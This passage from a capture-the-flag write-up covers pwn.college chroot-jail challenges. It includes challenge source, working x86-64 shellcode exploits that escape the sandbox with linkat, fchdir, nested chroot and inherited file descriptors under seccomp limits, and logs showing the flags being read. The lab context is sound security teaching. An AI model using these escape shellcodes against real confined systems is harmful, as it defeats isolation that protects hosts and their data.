    /* linkat(3, "flag", AT_FDCWD, "/flag2", 0) */
    mov rdi, 3
    lea rsi, [rip + old_path]
    mov rdx, -100              /* AT_FDCWD */
    lea r10, [rip + new_path]
    xor r8, r8
    mov rax, 265               /* linkat */
    syscall

    /* open("/flag2", O_RDONLY) */
    lea rdi, [rip + new_path]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

old_path:
    .string "flag"

new_path:
    .string "/flag2"
"""

# Start challenge
p = process(["/challenge/babyjail_level5", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~seccomp-linkat:~/cse240/25-proj-mud/01$ python ~/script.py
###
### Welcome to /challenge/babyjail_level5!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-kP6PF7`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 59 00 00 00                          | lea rsi, [rip + 0x59]
0x000000000133700e | 48 c7 c2 9c ff ff ff                          | mov rdx, 0xffffffffffffff9c
0x0000000001337015 | 4c 8d 15 50 00 00 00                          | lea r10, [rip + 0x50]
0x000000000133701c | 4d 31 c0                                      | xor r8, r8
0x000000000133701f | 48 c7 c0 09 01 00 00                          | mov rax, 0x109
0x0000000001337026 | 0f 05                                         | syscall 
0x0000000001337028 | 48 8d 3d 3d 00 00 00                          | lea rdi, [rip + 0x3d]
0x000000000133702f | 48 31 f6                                      | xor rsi, rsi
0x0000000001337032 | 48 31 d2                                      | xor rdx, rdx
0x0000000001337035 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x000000000133703c | 0f 05                                         | syscall 
0x000000000133703e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337045 | 48 89 c6                                      | mov rsi, rax
0x0000000001337048 | 48 31 d2                                      | xor rdx, rdx
0x000000000133704b | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337052 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337059 | 0f 05                                         | syscall 
0x000000000133705b | 48 31 ff                                      | xor rdi, rdi
0x000000000133705e | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337065 | 0f 05                                         | syscall 
0x0000000001337067 | 66 6c                                         | insb byte ptr [rdi], dx

Restricting system calls (default: kill).

Allowing syscall: linkat (number 265).
Allowing syscall: open (number 2).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{4PRRy2n67Lon0Tg5w8npcnLjij6.0VNzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-fchdir

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["fchdir", "open", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level6.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "fchdir", SCMP_SYS(fchdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

The `fchdir` syscall works similar to `chdir`, the only difference is that it takes a file descriptor as argument.

### `fchdir` syscall

```c
int fchdir(int fd);
```

This challenge opens the file / directory that we pass as an argument, and stores it file descriptor.

```c title="/challenge/babyjail_level6.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

Since, this is done before `chroot`, we can jump out of sandbox using the file descriptor.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* fchdir(3) */
    mov rdi, 3
    mov rax, 81          /* fchdir */
    syscall

    /* open("flag", O_RDONLY) */
    lea rdi, [rip + flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "flag"
"""

p = process(["/challenge/babyjail_level6", "/"], env={})

shellcode = asm(shellcode_asm)

p.send(shellcode)

p.interactive()
```

```
hacker@sandboxing~seccomp-fchdir:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level6!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-EVKxyv`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 c7 c0 51 00 00 00                          | mov rax, 0x51
0x000000000133700e | 0f 05                                         | syscall 
0x0000000001337010 | 48 8d 3d 38 00 00 00                          | lea rdi, [rip + 0x38]
0x0000000001337017 | 48 31 f6                                      | xor rsi, rsi
0x000000000133701a | 48 31 d2                                      | xor rdx, rdx
0x000000000133701d | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x0000000001337024 | 0f 05                                         | syscall 
0x0000000001337026 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x000000000133702d | 48 89 c6                                      | mov rsi, rax
0x0000000001337030 | 48 31 d2                                      | xor rdx, rdx
0x0000000001337033 | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x000000000133703a | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337041 | 0f 05                                         | syscall 
0x0000000001337043 | 48 31 ff                                      | xor rdi, rdi
0x0000000001337046 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x000000000133704d | 0f 05                                         | syscall 
0x000000000133704f | 66 6c                                         | insb byte ptr [rdi], dx

Restricting system calls (default: kill).

Allowing syscall: fchdir (number 81).
Allowing syscall: open (number 2).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{gdl6JknyXSM1hg5qMBaPf_8wXuh.0lNzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-rechroot

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["chdir", "chroot", "mkdir", "open", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level7.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "chdir", SCMP_SYS(chdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "chroot", SCMP_SYS(chroot));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "mkdir", SCMP_SYS(mkdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mkdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This challenge opens the file / directory that we pass as an argument, and stores it file descriptor.

```c title="/challenge/babyjail_level6.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

It then originally sets the root to `/tmp/jail-XXXXXX`. 

```c title="/challenge/babyjail_level7.c" showLineNumbers
# ---- snip ----

    char jail_path[] = "/tmp/jail-XXXXXX";

# ---- snip ----
```

### `chroot` syscall

We can use the file descriptor from the argument to make a new directory within `/tmp/jail-XXXXXX`, and then `chroot` to that child directory.
Thus, we would effectively escape the jail.

### Exploit

```py title="~/script.py" showLineNumbers
ffrom pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* mkdir("escape", 0777) — create a subdirectory inside the jail to chroot into */
    lea rdi, [rip + escape]
    mov rsi, 0x1ff
    mov rax, 83
    syscall

    /* chroot("escape") — re-root into subdirectory; CWD is now outside the new root */
    lea rdi, [rip + escape]
    mov rax, 161
    syscall

    /* chdir("../../../../../../../../") — walk up the real filesystem past the jail */
    lea rdi, [rip + dotdots]
    mov rax, 80
    syscall

    /* chroot(".") — re-root at CWD, which is now the real filesystem root */
    lea rdi, [rip + dot]
    mov rax, 161
    syscall

    /* open("flag", O_RDONLY) */
    lea rdi, [rip + flag]
    xor rsi, rsi
    mov rax, 2
    syscall

    /* sendfile(stdout, flag_fd, NULL, 0x100) — write flag to stdout */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

escape:
    .string "escape"

dotdots:
    .string "../../../../../../../../"

dot:
    .string "."

flag:
    .string "flag"
"""

p = process(["/challenge/babyjail_level7", "/"], env={})
p.send(asm(shellcode_asm))
p.interactive()
```

```
hacker@sandboxing~seccomp-rechroot:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level7!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-9aow8p`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 8d 3d 70 00 00 00                          | lea rdi, [rip + 0x70]
0x0000000001337007 | 48 c7 c6 ff 01 00 00                          | mov rsi, 0x1ff
0x000000000133700e | 48 c7 c0 53 00 00 00                          | mov rax, 0x53
0x0000000001337015 | 0f 05                                         | syscall 
0x0000000001337017 | 48 8d 3d 59 00 00 00                          | lea rdi, [rip + 0x59]
0x000000000133701e | 48 c7 c0 a1 00 00 00                          | mov rax, 0xa1
0x0000000001337025 | 0f 05                                         | syscall 
0x0000000001337027 | 48 8d 3d 50 00 00 00                          | lea rdi, [rip + 0x50]
0x000000000133702e | 48 c7 c0 50 00 00 00                          | mov rax, 0x50
0x0000000001337035 | 0f 05                                         | syscall 
0x0000000001337037 | 48 8d 3d 59 00 00 00                          | lea rdi, [rip + 0x59]
0x000000000133703e | 48 c7 c0 a1 00 00 00                          | mov rax, 0xa1
0x0000000001337045 | 0f 05                                         | syscall 
0x0000000001337047 | 48 8d 3d 4b 00 00 00                          | lea rdi, [rip + 0x4b]
0x000000000133704e | 48 31 f6                                      | xor rsi, rsi
0x0000000001337051 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x0000000001337058 | 0f 05                                         | syscall 
0x000000000133705a | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337061 | 48 89 c6                                      | mov rsi, rax
0x0000000001337064 | 48 31 d2                                      | xor rdx, rdx
0x0000000001337067 | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x000000000133706e | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337075 | 0f 05                                         | syscall 
0x0000000001337077 | 65 73 63                                      | jae 0x13370dd

Restricting system calls (default: kill).

Allowing syscall: chdir (number 80).
Allowing syscall: chroot (number 161).
Allowing syscall: mkdir (number 83).
Allowing syscall: open (number 2).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{IKG8YqPi4XRsQEXlRM67ZtjSoI-.01NzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-only

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level8.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "openat", SCMP_SYS(openat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This time the challenge does not accept any arguments.

We will have to open the directory in the shell itself and then pass use the file descriptor.
This is possible because the child (`/challenge/babyjail_level8.c`) inherits the file descriptors of the parent (shell).

### Exploit

```py title="~/script.py" showLineNumbers
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "error"

shellcode = """
    /* openat(3, "flag", O_RDONLY) */
    mov rdi, 3
    lea rsi, [rip + path]
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit */
    xor rdi, rdi
    mov rax, 60
    syscall

path:
    .string "flag"
"""

# Send raw shellcode to stdin (the running challenge)
import sys
sys.stdout.buffer.write(asm(shellcode))
```

```
hacker@sandboxing~seccomp-only:~$ exec 3</; python ~/script.py | /challenge/babyjail_level8
###
### Welcome to /challenge/babyjail_level8!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Creating a jail at `/tmp/jail-yAZGLu`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 38 00 00 00                          | lea rsi, [rip + 0x38]
0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
0x0000000001337011 | 4d 31 d2                                      | xor r10, r10
0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
0x000000000133701b | 0f 05                                         | syscall 
0x000000000133701d | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337024 | 48 89 c6                                      | mov rsi, rax
0x0000000001337027 | 48 31 d2                                      | xor rdx, rdx
0x000000000133702a | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337031 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337038 | 0f 05                                         | syscall 
0x000000000133703a | 48 31 ff                                      | xor rdi, rdi
0x000000000133703d | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337044 | 0f 05                                         | syscall 
0x0000000001337046 | 66 6c                                         | insb byte ptr [rdi], dx

Restricting system calls (default: kill).

Allowing syscall: openat (number 257).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{ccdGbakxPdlRLB00-I_4w9qq897.0FOzIDL4ITM0EzW}
Bad system call            python ~/script.py | /challenge/babyjail_level8
```

&nbsp;

## seccomp-arch32

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["close", "stat", "fstat", "lstat"]

```c title="/challenge/babyjail_level9.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

